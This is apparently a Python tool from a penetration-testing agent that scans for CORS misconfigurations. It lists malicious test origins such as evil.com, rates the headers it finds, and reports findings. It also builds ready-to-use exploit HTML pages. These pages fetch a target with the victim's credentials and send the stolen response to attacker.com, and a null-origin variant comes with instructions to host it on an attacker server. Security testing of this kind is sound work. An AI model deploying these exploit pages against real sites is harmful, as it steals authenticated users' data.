"""CORS Scanner tool for detecting CORS misconfigurations."""

from __future__ import annotations

import urllib.parse
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    add_workflow_hint_for_url_params,
    detect_url_in_unknown_params,
    generate_usage_hint,
    validate_action_param,
    validate_unknown_params,
)


CORSAction = Literal["scan", "test_origin", "test_null", "generate_report"]


def _generate_test_origins(target_origin: str) -> list[dict[str, str]]:
    """Generate test origins for CORS testing."""
    parsed = urllib.parse.urlparse(target_origin)
    domain = parsed.netloc

    # Extract base domain parts
    domain_parts = domain.split(".")
    if len(domain_parts) >= 2:
        base_domain = ".".join(domain_parts[-2:])
    else:
        base_domain = domain

    test_origins = [
        {"origin": "https://evil.com", "description": "Arbitrary external origin"},
        {"origin": "null", "description": "Null origin (sandboxed iframe, data: URL)"},
        {
            "origin": f"https://{domain}.evil.com",
            "description": "Target domain as subdomain of attacker",
        },
        {"origin": f"https://evil.{domain}", "description": "Attacker subdomain of target"},
        {"origin": f"https://evil{domain}", "description": "Domain suffix confusion"},
        {"origin": f"https://{base_domain}.evil.com", "description": "Base domain confusion"},
        {"origin": f"http://{domain}", "description": "Protocol downgrade (HTTP)"},
        {"origin": f"https://sub.{domain}", "description": "Arbitrary subdomain"},
        {"origin": f"https://{domain}@evil.com", "description": "Authority confusion"},
        {"origin": f"https://{domain}%60evil.com", "description": "URL encoding bypass"},
    ]

    return test_origins


def _analyze_cors_headers(headers: dict[str, str]) -> dict[str, Any]:
    """Analyze CORS response headers for vulnerabilities."""
    analysis: dict[str, Any] = {
        "headers_present": {},
        "issues": [],
        "info": [],
    }

    # Normalize header names to lowercase
    normalized = {k.lower(): v for k, v in headers.items()}

    # Check Access-Control-Allow-Origin
    acao = normalized.get("access-control-allow-origin")
    if acao:
        analysis["headers_present"]["Access-Control-Allow-Origin"] = acao

        if acao == "*":
            analysis["info"].append({
                "header": "Access-Control-Allow-Origin",
                "value": acao,
                "message": "Wildcard origin - check if credentials are also allowed",
            })
        elif acao == "null":
            analysis["issues"].append({
                "severity": "high",
                "header": "Access-Control-Allow-Origin",
                "value": acao,
                "message": "Null origin allowed - exploitable via sandboxed iframe",
            })

    # Check Access-Control-Allow-Credentials
    acac = normalized.get("access-control-allow-credentials")
    if acac:
        analysis["headers_present"]["Access-Control-Allow-Credentials"] = acac

        if acac.lower() == "true":
            if acao and acao != "*":
                analysis["issues"].append({
                    "severity": "critical",
                    "header": "Access-Control-Allow-Credentials",
                    "value": acac,
                    "message": f"Credentials allowed with origin: {acao} - if origin is reflected, this is exploitable",
                })
            elif acao == "*":
                analysis["info"].append({
                    "header": "Access-Control-Allow-Credentials",
                    "message": "Credentials with wildcard - browser blocks this, but indicates misconfiguration",
                })

    # Check Access-Control-Allow-Methods
    acam = normalized.get("access-control-allow-methods")
    if acam:
        analysis["headers_present"]["Access-Control-Allow-Methods"] = acam

    # Check Access-Control-Allow-Headers
    acah = normalized.get("access-control-allow-headers")
    if acah:
        analysis["headers_present"]["Access-Control-Allow-Headers"] = acah

    # Check Access-Control-Expose-Headers
    aceh = normalized.get("access-control-expose-headers")
    if aceh:
        analysis["headers_present"]["Access-Control-Expose-Headers"] = aceh

    # Check Vary header
    vary = normalized.get("vary")
    if vary:
        if "origin" not in vary.lower():
            analysis["issues"].append({
                "severity": "medium",
                "header": "Vary",
                "value": vary,
                "message": "Vary header doesn't include Origin - potential cache poisoning",
            })

    return analysis


def _test_origin_reflection(
    test_origin: str,
    response_headers: dict[str, str],
) -> dict[str, Any]:
    """Test if origin is reflected in CORS headers."""
    normalized = {k.lower(): v for k, v in response_headers.items()}
    acao = normalized.get("access-control-allow-origin", "")
    acac = normalized.get("access-control-allow-credentials", "")

    result: dict[str, Any] = {
        "test_origin": test_origin,
        "reflected": acao == test_origin,
        "acao_value": acao,
        "credentials_allowed": acac.lower() == "true",
        "vulnerable": False,
    }

    if acao == test_origin:
        result["vulnerable"] = True
        result["severity"] = "critical" if acac.lower() == "true" else "medium"
        result["description"] = (
            f"Origin {test_origin} is reflected in Access-Control-Allow-Origin"
            + (" with credentials allowed" if acac.lower() == "true" else "")
        )

    return result


def _generate_exploit(
    target_url: str,
    vulnerable_origin: str,
    credentials: bool = False,
) -> str:
    """Generate exploitation code for CORS vulnerability."""
    creds_option = "credentials: 'include'," if credentials else ""

    exploit = f"""<!DOCTYPE html>
<html>
<head>
  <title>CORS Exploit</title>
</head>
<body>
<script>
// CORS Exploit for {target_url}
// Vulnerable origin: {vulnerable_origin}

fetch('{target_url}', {{
  method: 'GET',
  {creds_option}
  mode: 'cors'
}})
.then(response => response.text())
.then(data => {{
  // Exfiltrate data to attacker server
  console.log('Stolen data:', data);
  navigator.sendBeacon('https://attacker.com/collect', data);
}})
.catch(error => console.error('Error:', error));
</script>
</body>
</html>"""

    return exploit


def _generate_null_origin_exploit(target_url: str, credentials: bool = False) -> str:
    """Generate null origin exploit using sandboxed iframe."""
    creds_option = "credentials: 'include'," if credentials else ""

    exploit = f"""<!DOCTYPE html>
<html>
<head>
  <title>Null Origin CORS Exploit</title>
</head>
<body>
<!-- Sandboxed iframe generates null origin -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('{target_url}', {{
  method: 'GET',
  {creds_option}
  mode: 'cors'
}})
.then(response => response.text())
.then(data => {{
  parent.postMessage(data, '*');
}});
</script>
"></iframe>

<script>
window.addEventListener('message', function(e) {{
  console.log('Stolen data:', e.data);
  // Send to attacker server
  fetch('https://attacker.com/collect', {{
    method: 'POST',
    body: e.data
  }});
}});
</script>
</body>
</html>"""

    return exploit


@register_tool
def cors_scanner(
    action: CORSAction,
    target_url: str,
    test_origin: str | None = None,
    response_headers: dict[str, str] | None = None,
    **kwargs: Any,  # Capture unknown parameters
) -> dict[str, Any]:
    """Scan and test for CORS misconfigurations.

    This tool helps identify Cross-Origin Resource Sharing (CORS)
    vulnerabilities including origin reflection, null origin acceptance,
    and credential leakage.

    Args:
        action: The scanning action to perform:
            - scan: Generate test origins for manual testing
            - test_origin: Test specific origin reflection
            - test_null: Generate null origin exploit
            - generate_report: Generate full vulnerability report
        target_url: The URL to test for CORS vulnerabilities
        test_origin: Specific origin to test (for test_origin action)
        response_headers: CORS response headers to analyze

    Returns:
        Scan results including test origins, vulnerability analysis,
        and exploitation code
    """
    # Define valid parameters and actions
    VALID_PARAMS = {"action", "target_url", "test_origin", "response_headers"}
    VALID_ACTIONS = ["scan", "test_origin", "test_null", "generate_report"]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "cors_scanner")
    if unknown_error:
        unknown_params = list(kwargs.keys())
        if detect_url_in_unknown_params(unknown_params):
            workflow_steps = [
                "1. Use send_request(method='GET', url='https://example.com', headers={'Origin': 'https://evil.com'})",
                "2. Extract response headers from the response",
                "3. Call cors_scanner(action='generate_report', target_url='https://example.com', response_headers={...})",
            ]
            unknown_error = add_workflow_hint_for_url_params(unknown_error, workflow_steps)
        unknown_error.update(
            generate_usage_hint("cors_scanner", "scan", {"target_url": "https://example.com"})
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "cors_scanner")
    if action_error:
        action_error["usage_examples"] = {
            "scan": "cors_scanner(action='scan', target_url='https://example.com')",
            "test_origin": "cors_scanner(action='test_origin', target_url='https://example.com', test_origin='https://evil.com')",
        }
        return action_error

    try:
        if action == "scan":
            # Parse target URL
            parsed = urllib.parse.urlparse(target_url)
            target_origin = f"{parsed.scheme}://{parsed.netloc}"

            test_origins = _generate_test_origins(target_origin)

            return {
                "target_url": target_url,
                "target_origin": target_origin,
                "test_origins": test_origins,
                "instructions": (
                    "For each test origin, send a request with the Origin header "
                    "and check if Access-Control-Allow-Origin reflects the value. "
                    "If credentials are also allowed (Access-Control-Allow-Credentials: true), "
                    "the vulnerability is critical."
                ),
                "curl_template": (
                    f'curl -H "Origin: {{origin}}" -I {target_url}'
                ),
            }

        if action == "test_origin":
            if not test_origin:
                return {"error": "test_origin parameter required for this action"}
            if not response_headers:
                return {"error": "response_headers parameter required for this action"}

            result = _test_origin_reflection(test_origin, response_headers)

            if result["vulnerable"]:
                result["exploit"] = _generate_exploit(
                    target_url,
                    test_origin,
                    result["credentials_allowed"],
                )

            return result

        if action == "test_null":
            if response_headers:
                analysis = _analyze_cors_headers(response_headers)
                null_allowed = any(
                    issue.get("value") == "null"
                    for issue in analysis.get("issues", [])
                )
            else:
                null_allowed = None

            return {
                "target_url": target_url,
                "null_origin_vulnerable": null_allowed,
                "exploit": _generate_null_origin_exploit(target_url, credentials=True),
                "instructions": (
                    "Host this HTML on an attacker-controlled server. "
                    "The sandboxed iframe generates a null Origin header. "
                    "If the target accepts null origin, victim data will be exfiltrated."
                ),
            }

        if action == "generate_report":
            if not response_headers:
                return {"error": "response_headers parameter required for this action"}

            analysis = _analyze_cors_headers(response_headers)

            # Generate summary
            critical_issues = [i for i in analysis["issues"] if i.get("severity") == "critical"]
            high_issues = [i for i in analysis["issues"] if i.get("severity") == "high"]
            medium_issues = [i for i in analysis["issues"] if i.get("severity") == "medium"]

            return {
                "target_url": target_url,
                "headers_analyzed": analysis["headers_present"],
                "issues": analysis["issues"],
                "info": analysis["info"],
                "summary": {
                    "critical": len(critical_issues),
                    "high": len(high_issues),
                    "medium": len(medium_issues),
                    "overall_risk": (
                        "critical" if critical_issues
                        else "high" if high_issues
                        else "medium" if medium_issues
                        else "low"
                    ),
                },
            }

        return {"error": f"Unknown action: {action}"}

    except Exception as e:
        return {"error": f"CORS scan failed: {e!s}"}
